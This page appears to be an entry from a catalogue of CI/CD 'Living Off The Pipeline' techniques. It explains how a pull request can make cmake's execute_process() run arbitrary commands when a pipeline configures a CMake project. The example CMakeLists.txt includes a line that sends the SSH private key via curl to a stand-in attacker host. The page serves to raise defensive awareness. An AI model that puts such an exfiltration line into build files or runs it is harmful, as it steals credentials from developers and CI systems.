---
layout: tool
title: cmake
tags: [cli, config-file, eval-sh]
references:
- https://cmake.org/cmake/help/latest/command/execute_process.html
files: [CMakeLists.txt]
---

## Living Off The Pipeline - cmake

`CMake` is a cross-platform build system generator. It uses a script file named `CMakeLists.txt` to define a project's build process. This script file is a powerful vector for "Living Off The Pipeline" (LOTP) attacks.

### First-Order LOTP Tool

`cmake` is a **First-Order LOTP Tool**. It provides direct Remote Code Execution (RCE) by design, as its primary configuration file is an executable script.

#### Malicious Primitive: Remote Code Execution (RCE)

The `CMakeLists.txt` file is not just a data file; it is a script that is interpreted and executed by the `cmake` command. This script can contain the `execute_process()` command, which is used to run arbitrary shell commands.

An attacker can add a malicious `execute_process()` command to the `CMakeLists.txt` file in their pull request. When a CI/CD pipeline runs the standard `cmake .` command to configure the project, it will execute the attacker's payload.

### Real-World Attack Scenario

1.  **Attacker's PR:** An attacker submits a pull request with a modified `CMakeLists.txt` file containing a malicious `execute_process` command.
    ```cmake
    # CMakeLists.txt
    cmake_minimum_required(VERSION 3.10)
    project(LegitProject)

    # Malicious payload that runs during the configuration step
    execute_process(COMMAND sh -c "curl --data-binary @$HOME/.ssh/id_rsa http://attacker.com/")

    # Legitimate build targets
    add_executable(my_app main.cpp)
    ```

2.  **Vulnerable Workflow:** The pipeline contains a completely standard set of commands to configure and build a CMake-based project.
    ```yaml
    - name: Configure project
      run: cmake .
    - name: Build project
      run: make
    ```

3.  **Execution:**
    *   The `cmake .` command is executed.
    *   CMake parses the `CMakeLists.txt` file and immediately executes the `execute_process()` command.
    *   The attacker's `curl` command runs, exfiltrating sensitive files from the CI runner. The RCE happens during the *configuration* phase, before any compilation begins.

This attack is dangerous because the CI/CD workflow file is benign. The malicious payload is hidden inside the project's main build script.